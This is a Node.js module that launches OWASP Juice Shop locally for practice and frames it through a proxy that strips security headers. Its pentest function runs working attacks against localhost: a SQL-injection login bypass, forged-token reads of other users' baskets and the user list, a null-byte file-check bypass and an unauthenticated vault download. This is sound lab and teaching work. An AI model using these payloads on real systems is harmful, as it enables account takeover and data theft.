// OWASP Juice Shop: a deliberately vulnerable web app, run locally as a safe, legal target to practice the cyber
// tools and ARTEX against. Moundshroud starts it on 3017 and shows it inside the Cyber tab through a small proxy on
// 3018 that strips the X-Frame-Options header (Juice Shop sends SAMEORIGIN, which would otherwise block the frame).
const cp = require('child_process'), path = require('path'), fs = require('fs'), net = require('net'), http = require('http');
const RT = path.join(__dirname, '..', 'runtime'), PORT = 3017, FRAME = 3018;
function appDir() {
  try {
    const base = path.join(RT, 'juiceshop');
    if (fs.existsSync(path.join(base, 'build', 'app.js'))) return base;
    for (const d of fs.readdirSync(base)) { const p = path.join(base, d); try { if (fs.statSync(p).isDirectory() && fs.existsSync(path.join(p, 'build', 'app.js'))) return p; } catch (e) { } }
  } catch (e) { }
  return '';
}
let proc = null, starting = false, proxy = null;
const delay = ms => new Promise(r => setTimeout(r, ms));
const portUp = port => new Promise(r => { const s = net.connect({ host: '127.0.0.1', port }, () => { s.destroy(); r(true); }); s.on('error', () => r(false)); s.setTimeout(700, () => { s.destroy(); r(false); }); });
const installed = () => !!appDir();
function killTree(pid) { try { cp.spawnSync('taskkill', ['/PID', String(pid), '/T', '/F'], { stdio: 'ignore', windowsHide: true }); } catch (e) { } }
function pidOnPort(port) { try { const out = cp.execSync('netstat -ano -p tcp', { windowsHide: true }).toString(); for (const ln of out.split('\n')) { const m = ln.match(/^\s*TCP\s+\S+:(\d+)\s+\S+\s+LISTENING\s+(\d+)/); if (m && +m[1] === port) return +m[2]; } } catch (e) { } return 0; }

/* the frame proxy: forwards 3018 -> Juice Shop on 3017, dropping headers that forbid being shown in a frame */
function startProxy() {
  if (proxy) return;
  proxy = http.createServer((req, res) => {
    const pr = http.request({ host: '127.0.0.1', port: PORT, path: req.url, method: req.method, headers: req.headers }, r => {
      const h = Object.assign({}, r.headers); delete h['x-frame-options']; delete h['content-security-policy']; delete h['content-security-policy-report-only'];
      res.writeHead(r.statusCode, h); r.pipe(res);
    });
    pr.on('error', () => { try { res.writeHead(502); res.end('Juice Shop is still starting.'); } catch (e) { } });
    req.pipe(pr);
  });
  proxy.on('upgrade', (req, socket, head) => {               // socket.io websocket for the live score board
    const pr = http.request({ host: '127.0.0.1', port: PORT, path: req.url, method: req.method, headers: req.headers });
    pr.on('upgrade', (prr, psock, phead) => {
      socket.write('HTTP/1.1 101 ' + (prr.statusMessage || 'Switching Protocols') + '\r\n' + Object.keys(prr.headers).map(k => k + ': ' + prr.headers[k]).join('\r\n') + '\r\n\r\n');
      if (phead && phead.length) psock.unshift(phead); psock.pipe(socket); socket.pipe(psock);
    });
    pr.on('error', () => socket.destroy()); pr.end();
  });
  proxy.on('error', () => { });
  proxy.listen(FRAME, '127.0.0.1');
}
function stopProxy() { if (proxy) { try { proxy.close(); } catch (e) { } proxy = null; } }

async function status() { const up = await portUp(PORT); return { installed: installed(), up, starting, port: FRAME, url: 'http://127.0.0.1:' + FRAME }; }
async function start() {
  const dir = appDir(); if (!dir) return { ok: false, error: 'Juice Shop is not installed in the runtime folder.', ...(await status()) };
  if (starting) return status();
  if (await portUp(PORT)) { startProxy(); return status(); }
  starting = true;
  try {
    const log = fs.openSync(path.join(RT, 'juiceshop.log'), 'w');
    proc = cp.spawn(process.execPath, ['build/app.js'], { cwd: dir, windowsHide: true, stdio: ['ignore', log, log], env: { ...process.env, PORT: String(PORT), NODE_ENV: 'unsafe' } });
    proc.unref();
    for (let i = 0; i < 120 && !(await portUp(PORT)); i++) await delay(500);   // first boot builds its database
    startProxy();
  } catch (e) { starting = false; return { ok: false, error: String(e && e.message || e), ...(await status()) }; }
  starting = false; return status();
}
async function stop() { stopProxy(); const pid = (proc && proc.pid) || pidOnPort(PORT); if (pid) killTree(pid); proc = null; return status(); }
function stopAll() { stopProxy(); const pid = (proc && proc.pid) || pidOnPort(PORT); if (pid) killTree(pid); proc = null; }
/* ---- a legal pentest of this shop, from the shell ------------------------------------------------------------
   Every check talks to 127.0.0.1 only. The target is the local copy of Juice Shop, which exists to be broken into;
   nothing here resolves a name, leaves the computer or touches any other host. */
const ADMIN_MD5 = '0192023a7bbd73250516f069df18b500';        // md5('admin123'), the password Juice Shop ships with
const jwtPayload = t => { try { const p = JSON.parse(Buffer.from(String(t).split('.')[1].replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8')); return (p && p.data) || p; } catch (e) { return null; } };
function req(pathname, opts) {
  return new Promise(done => {
    const o = Object.assign({ host: '127.0.0.1', port: PORT, path: pathname, method: 'GET', timeout: 6000, headers: {} }, opts || {});
    const payload = o.body == null ? null : Buffer.from(String(o.body));
    if (payload) o.headers = Object.assign({}, o.headers, { 'Content-Type': 'application/json', 'Content-Length': payload.length });
    const r = http.request(o, res => {
      let t = ''; res.setEncoding('utf8');
      res.on('data', c => { if (t.length < 120000) t += c; });
      res.on('end', () => done({ status: res.statusCode, headers: res.headers, body: t }));
    });
    r.on('error', e => done({ error: String(e && e.message || e) }));
    r.on('timeout', () => { r.destroy(); done({ error: 'timed out' }); });
    if (payload) r.write(payload);
    r.end();
  });
}
const SEVRANK = { critical: 0, high: 1, medium: 2, low: 3 };
async function pentest() {
  if (!(await portUp(PORT))) return { error: 'Juice Shop is not running. Type `juice start` first — a pentest needs the shop up.' };
  const findings = [], url = 'http://127.0.0.1:' + PORT;
  let checks = 0, version = '';
  const add = f => findings.push(f);

  /* what is it, and does it say so out loud */
  checks++;
  let r = await req('/rest/admin/application-version');
  if (r.status === 200 && /"version"\s*:/.test(r.body || '')) {
    try { version = JSON.parse(r.body).version || ''; } catch (e) { }
    add({ id: 'version', severity: 'low', title: 'The shop publishes its exact version to anyone',
      evidence: 'GET /rest/admin/application-version → 200 {"version":"' + version + '"}',
      impact: 'A version number is a shopping list of known bugs: match it to the project’s release notes and the exploit writes itself.',
      fix: 'Keep build metadata off public routes and patch on a schedule instead of trusting obscurity.' });
  }

  /* login: SQL injection */
  checks++;
  r = await req('/rest/user/login', { method: 'POST', body: JSON.stringify({ email: "' OR 1=1--", password: 'x' }) });
  let tok = '';
  if (r.status === 200) { try { tok = (JSON.parse(r.body).authentication || {}).token || ''; } catch (e) { } }
  const tokData = tok ? jwtPayload(tok) : null;
  if (tok) add({ id: 'sqli-login', severity: 'critical', title: 'Log in as anyone with SQL injection',
    evidence: "POST /rest/user/login  email: ' OR 1=1--  →  200 · signed in as " + ((tokData && tokData.email) || 'the first row, whoever it is') +
      ' with role ' + ((tokData && tokData.role) || 'user') + ' — the password was never checked',
    impact: 'No password needed for any account, including the administrator. Everything the shop trusts the session to mean is now attacker-chosen.',
    fix: 'Use parameterised queries or an ORM for every lookup; never assemble a WHERE clause from request text.' });

  /* the token itself */
  checks++;
  if (tokData && tokData.password) add({ id: 'hash-leak', severity: 'high', title: 'Every sign-in hands over the password hash',
    evidence: 'JWT payload carries password "' + tokData.password + '" — unsalted MD5' + (tokData.password === ADMIN_MD5 ? ', i.e. the word “admin123”' : ''),
    impact: 'Tokens are readable by anyone, and an unsalted MD5 falls to a word list in seconds. The hash unlocks reused passwords elsewhere.',
    fix: 'Never put credentials of any kind in a token; store passwords with bcrypt/argon2 and a per-user salt.' });

  /* another customer’s basket */
  if (tok) {
    checks++;
    r = await req('/rest/basket/2', { headers: { Authorization: 'Bearer ' + tok } });
    if (r.status === 200 && /"Products"/.test(r.body || '')) {
      let n = 0; try { n = (JSON.parse(r.body).data.Products || []).length; } catch (e) { }
      add({ id: 'bola', severity: 'high', title: 'Read another customer’s basket by changing the number',
        evidence: 'GET /rest/basket/2 with the forged token → 200 · basket 2 and its ' + n + ' item(s), which belong to somebody else',
        impact: 'The server never asks whose basket it is. Change the id and every order in the shop is readable — and the pattern repeats wherever records are addressed by id.',
        fix: 'Authorise each object against the token subject before returning it; ids must never be the only access check.' });
    }
  }

  /* the folder nobody meant to publish */
  checks++;
  const vault = await req('/ftp/incident-support.kdbx');
  const vaultLen = +((vault.headers && vault.headers['content-length']) || 0);
  if (vault.status === 200 && vaultLen > 500) add({ id: 'ftp', severity: 'high', title: 'A password vault is downloadable with no login',
    evidence: 'GET /ftp/incident-support.kdbx → 200 · ' + vaultLen + ' bytes of a KeePass vault (while /ftp/package.json.bak is refused with 403 — the extension filter is the only lock)',
    impact: 'An attacker grinds the vault offline for as long as they like; it holds the credentials of everyone who ever used it.',
    fix: 'Serve fixed routes from a fixed folder and never deploy backups, vaults or archives with the app; decide by path, not by file extension.' });

  /* the null byte that opens the same files */
  checks++;
  r = await req('/ftp/package.json.bak%2500.md');
  if (r.status === 200 && /juice-shop/.test(r.body || '')) add({ id: 'null-byte', severity: 'high', title: 'A doubly-encoded null byte walks around the file check',
    evidence: 'GET /ftp/package.json.bak%2500.md → 200 · the backup file’s contents ("juice-shop")',
    impact: 'A filename check that trusts what it is given is not a check. The same trick reaches configuration, keys and source.',
    fix: 'Resolve the path against a fixed base, then reject anything that escapes it; decode exactly once and validate the result.' });

  /* headers */
  checks++;
  r = await req('/');
  if (r.status === 200) {
    const want = [['content-security-policy', 'Content-Security-Policy'], ['strict-transport-security', 'Strict-Transport-Security'], ['referrer-policy', 'Referrer-Policy']];
    const miss = want.filter(([k]) => !r.headers[k]).map(x => x[1]);
    if (miss.length) add({ id: 'headers', severity: 'low', title: 'Responses arrive without their security headers',
      evidence: 'GET / missing: ' + miss.join(', '),
      impact: 'Without a policy, one injected string becomes running script; the rest leak addresses to third parties and allow downgrade.',
      fix: 'Send a strict Content-Security-Policy, HSTS and Referrer-Policy from the app, and test them in the browser, not just the source.' });
  }

  /* the customer list, with the same token */
  if (tok) {
    checks++;
    r = await req('/api/Users', { headers: { Authorization: 'Bearer ' + tok } });
    if (r.status === 200) {
      let n = 0; try { n = (JSON.parse(r.body).data || []).length; } catch (e) { }
      add({ id: 'users', severity: 'high', title: 'The whole customer list answers the forged token',
        evidence: 'GET /api/Users → 200 · ' + n + ' accounts with email addresses',
        impact: 'A user dump is the start of credential stuffing and phishing; every address here is a person the shop must now warn.',
        fix: 'Scope list endpoints to the caller’s own records, or require a role check that is enforced server-side.' });
    }
  }

  /* the control: anonymous access must be refused */
  checks++;
  r = await req('/api/Users');
  const control = r.status === 401;

  findings.sort((a, b) => (SEVRANK[a.severity] ?? 9) - (SEVRANK[b.severity] ?? 9));
  return { ok: true, target: url, version, checks, findings, control, at: new Date().toISOString() };
}

module.exports = { status, start, stop, stopAll, installed, pentest, PORT, FRAME };
